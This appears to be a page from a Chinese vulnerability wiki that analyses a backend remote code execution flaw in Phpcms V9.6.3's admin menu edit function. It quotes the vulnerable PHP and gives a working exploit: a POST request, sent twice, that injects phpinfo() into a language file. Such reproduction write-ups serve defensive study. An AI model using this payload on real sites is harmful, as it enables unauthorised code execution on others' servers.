@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20V9.6.3%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms V9.6.3 后台远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms V9.6.3 \u540e\u53f0\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 文件包含漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 前台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v963">Phpcms V9.6.3 后台远程命令执行漏洞<a class="headerlink" href="#phpcms-v963" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms V9.6.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞代码位于 <code>/phpcms/modules/admin/menu.php</code> 第 81 行</p>
+<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="n">edit</span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;dosubmit&#39;</span><span class="o">]</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="err">$</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;id&#39;</span><span class="o">]</span><span class="p">);</span>
+<span class="w">        </span><span class="o">//</span><span class="n">print_r</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;info&#39;</span><span class="o">]</span><span class="p">);</span><span class="k">exit</span><span class="p">;</span>
+<span class="w">        </span><span class="err">$</span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="n">get_one</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">id</span><span class="p">));</span>
+<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="k">update</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;info&#39;</span><span class="o">]</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">id</span><span class="p">));</span>
+<span class="w">        </span><span class="o">//</span><span class="n">修改语言文件</span>
+<span class="w">        </span><span class="err">$</span><span class="k">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PC_PATH</span><span class="p">.</span><span class="s1">&#39;languages&#39;</span><span class="p">.</span><span class="n">DIRECTORY_SEPARATOR</span><span class="p">.</span><span class="s1">&#39;zh-cn&#39;</span><span class="p">.</span><span class="n">DIRECTORY_SEPARATOR</span><span class="p">.</span><span class="s1">&#39;system_menu.lang.php&#39;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">require</span><span class="w"> </span><span class="err">$</span><span class="k">file</span><span class="p">;</span>
+<span class="w">        </span><span class="err">$</span><span class="k">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;info&#39;</span><span class="o">][</span><span class="n">&#39;name&#39;</span><span class="o">]</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">LANG</span><span class="o">[</span><span class="n">$key</span><span class="o">]</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="k">file</span><span class="p">);</span>
+<span class="w">            </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+<span class="w">            </span><span class="err">$</span><span class="k">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="p">.</span><span class="ss">&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;</span><span class="p">;</span>
+<span class="w">            </span><span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="k">file</span><span class="p">,</span><span class="err">$</span><span class="k">data</span><span class="p">);</span>
+<span class="w">        </span><span class="err">}</span><span class="w"> </span><span class="n">elseif</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">LANG</span><span class="o">[</span><span class="n">$key</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">LANG</span><span class="o">[</span><span class="n">$key</span><span class="o">]!=</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;language&#39;</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="k">file</span><span class="p">);</span>
+<span class="w">            </span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str_replace</span><span class="p">(</span><span class="err">$</span><span class="n">LANG</span><span class="o">[</span><span class="n">$key</span><span class="o">]</span><span class="p">,</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;language&#39;</span><span class="o">]</span><span class="p">,</span><span class="err">$</span><span class="n">content</span><span class="p">);</span>
+<span class="w">            </span><span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="k">file</span><span class="p">,</span><span class="err">$</span><span class="n">content</span><span class="p">);</span>
+<span class="w">        </span><span class="err">}</span>
+<span class="w">        </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">update_menu_models</span><span class="p">(</span><span class="err">$</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">r</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;info&#39;</span><span class="o">]</span><span class="p">);</span><span class="w">          </span>
+<span class="w">        </span><span class="o">//</span><span class="n">结束语言文件修改</span>
+<span class="w">        </span><span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s1">&#39;operation_success&#39;</span><span class="p">));</span>
+<span class="w">    </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span>
+
+<span class="w">    </span><span class="p">.</span><span class="w">  </span><span class="p">.</span><span class="w">  </span><span class="p">.</span><span class="w">   </span><span class="p">.</span><span class="w">  </span><span class="p">.</span><span class="w">  </span><span class="p">.</span>
+
+<span class="w">    </span><span class="err">}</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>这段代码是修改语言文件用的，而这个语言文件就是
+/phpcms/languages/zh-cn/system_menu.lang.php</p>
+<p>里面一堆类似 <code>$LANG['video'] = '视频';</code> 的东西</p>
+<p>当时用 rips 扫描发现的大多是
+<code>$data = $content."\$LANG['$key'] = '$_POST[language]';\r\n?&gt;";</code>
+这种拼接操作，而且 POST 中的单引号会被转义，无法逃逸</p>
+<p>转义代码位于 <code>/phpcms/libs/classes/param.class.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">get_magic_quotes_gpc</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">_POST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">_GET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">_REQUEST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">_COOKIE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_COOKIE</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div>
+
+<p>而这里突然看到一个 str_replace ，
+<code>str_replace($LANG[$key],$_POST['language'],$content)</code>，感觉可能会有漏洞</p>
+<p>一番胡乱测试之后惊奇的发现网站 500 了，细看原来是单引号逃逸导致报错</p>
+<p>下面是漏洞分析过程</p>
+<p>首先要登录后台拿到 pc_hash 的值，这个是防止提交恶意数据的，后台首页 F12
+就能看到</p>
+<p><img alt="1.png" src="../resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<p>然后访问：</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w
+</code></pre></div>
+
+<p>phpcms 的路由和那个 yzmcms 差不多，m 是模块名，对应 /phpcms
+下的文件夹，c 是控制器名，对应 /phpcms/模块/ 下的 php 文件名，a
+则对应控制器类的类函数名</p>
+<p>发送 POST 请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">dosubmit</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">info</span><span class="o">[</span><span class="n">name</span><span class="o">]=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">language</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></div>
+
+<p>语言文件最后会新添内容</p>
+<div class="codehilite"><pre><span></span><code>$LANG[&#39;1&#39;] = &#39;1&#39;;
+</code></pre></div>
+
+<h3 id="_5">第一次请求<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>发送 POST 请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">dosubmit</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">info</span><span class="o">[</span><span class="n">name</span><span class="o">]=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">language</span><span class="o">=</span><span class="mi">1</span><span class="err">&#39;</span>
+</code></pre></div>
+
+<p><code>require $file;</code> 引入语言文件，<code>$LANG[$key]</code> 的值还是
+NULL，所以执行拼接操作</p>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="k">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">content</span><span class="p">.</span><span class="ss">&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;</span><span class="p">;</span>
+<span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="k">file</span><span class="p">,</span><span class="err">$</span><span class="k">data</span><span class="p">);</span>
+</code></pre></div>
+
+<p>得到语言文件新添内容为</p>
+<div class="codehilite"><pre><span></span><code>$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;
+?&gt;
+</code></pre></div>
+
+<h3 id="_6">第二次请求<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>发送与第一次相同的 POST 请求</p>
+<p><code>require $file;</code> 引入语言文件得到 <code>$LANG[$key]</code> 的值是
+<code>string(2) "1'"</code>，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新
+<code>$LANG[$key]</code> 的值的</p>
+<p>但是因为 <code>require</code> 和 <code>file_get_contents</code>
+函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language
+会被转义处理得到的值是 <code>string(3) "1\'"</code></p>
+<p>于是判断 <code>$LANG[$key]!=$_POST['language']</code> 就成立了，接着 <code>str_replace</code>
+函数进行字符串替换操作，把原来的 <code>$LANG['1'] = '1\'';</code> 中的 <code>1'</code> 替换成
+<code>1\'</code>，最终写入文件</p>
+<p>结果就得到了以下文件内容，第二个单引号被反斜杠转义，无法闭合</p>
+<div class="codehilite"><pre><span></span><code>$LANG[&#39;1\&#39;] = &#39;1\&#39;&#39;;
+?&gt;
+</code></pre></div>
+
+<p>payload:</p>
+<p>发送两次以下请求，访问语言文件
+<a href="http://www.0-sec.org:9000/phpcms/languages/zh-cn/system">http://www.0-sec.org:9000/phpcms/languages/zh-cn/system</a>_menu.lang.php
+即可得到 phpinfo</p>
+<p>URL:</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w
+</code></pre></div>
+
+<p>POST:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">dosubmit</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">info</span><span class="o">[</span><span class="n">name</span><span class="o">]=</span><span class="err">]</span><span class="p">;</span><span class="n">phpinfo</span><span class="p">();</span><span class="o">//</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">language</span><span class="o">=</span><span class="err">]</span><span class="p">;</span><span class="n">phpinfo</span><span class="p">();</span><span class="o">//</span><span class="mi">1</span><span class="err">&#39;</span>
+</code></pre></div>
+
+<p><img alt="2.png" src="../resource/PhpcmsV9.6.3%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="http://j0k3r.top/2019/10/09/phpcmsv9.6.3">http://j0k3r.top/2019/10/09/phpcmsv9.6.3</a>_background_rce/</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 文件包含漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 前台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
